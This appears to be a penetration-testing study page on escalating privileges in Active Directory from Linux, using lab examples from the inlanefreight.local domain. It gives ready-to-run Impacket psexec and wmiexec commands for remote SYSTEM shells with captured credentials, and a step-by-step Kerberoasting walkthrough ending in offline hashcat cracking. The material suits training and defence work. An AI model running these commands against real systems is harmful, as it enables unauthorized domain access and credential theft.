---
title: Attacking Active Directory from Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Privileges escalation in Active Directory from Linux

[Index of Active Directory](active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)


There are several ways to gain SYSTEM-level access on a host, including but not limited to:

- Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
- Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
- Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window


By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:

- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
- Perform Kerberoasting / ASREPRoasting attacks within the same domain.
- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
- Perform token impersonation to hijack a privileged domain user account.
- Carry out ACL attacks.

##  PSExec.py

Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.


```shell-session
# Get help 
impacket-psexec -h

# Connect to a remote machine with a local administrator account
psexec.py $domain/$user:$password@$ip 

# Another way
impacket-psexec administrator:'<password>'@$ip
# Examples:
# psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130
# impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.130
```

```
# Results
C:\Windows\system32>whoami
nt authority\system
```


## wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).

```shell-session
# Connect to a remote machine with a local administrator account
wmiexec.py $domain/$user:$password@$ip 
# Examples:
# impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5 
# wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```


```
# Results
C:>whoami
domain\user22
```


## Kerberoasting

[See about Kerberos authentication](kerberos-authentication.md).

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. 

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary.

Requirements to perform a Kerberoasting attack:

- an account's cleartext password (or NTLM hash),
- a shell in the context of a domain user account or SYSTEM level access on a domain-joined host.

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

#### GetUserSPNs.py

[More about GetUserSPNs.py](impacket-GetUserSPNs.md).

**1**. Install Impacket from: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```

**2.** Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username
# -dc-ip: Domain controller IP.
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

**3.** Requesting all TGS Tickets:

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username -request 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

**4.** Or request just the TGS ticket for a specific account. 

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs
# -outputfile:  to write the TGS tickets to a file 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```


**5.** Cracking the Ticket Offline with Hashcat.

```bash
hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt 
```
